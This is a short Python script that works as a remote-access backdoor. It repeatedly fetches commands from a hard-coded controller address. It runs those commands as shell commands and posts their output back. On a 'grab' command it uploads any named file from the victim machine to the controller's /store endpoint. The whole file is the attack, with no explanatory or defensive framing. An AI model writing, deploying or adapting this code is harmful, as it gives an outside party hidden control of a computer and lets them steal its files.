
import requests 
import subprocess 
import os
import time


while True: 

    req = requests.get('http://111.111.11.11')
    command = req.text
        
    if 'terminate' in command:
        break # end the loop





    elif 'grab' in command:
        
        grab,path=command.split('*') 
        
        if os.path.exists(path):
            
            filename = path.split('\\')
            url = 'http://111.111.11.11/store?' + filename[-1] # Appended /store in the URL
            files = {'file': open(path, 'rb')} 
            r = requests.post(url, files=files) 
            
        else:
            post_response = requests.post(url='http://111.111.11.11', data='[-] Not able to find the file !' )
            
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://111.111.11.11', data=CMD.stdout.read() )
        post_response = requests.post(url='http://111.111.11.11', data=CMD.stderr.read() )
        
    time.sleep(3)
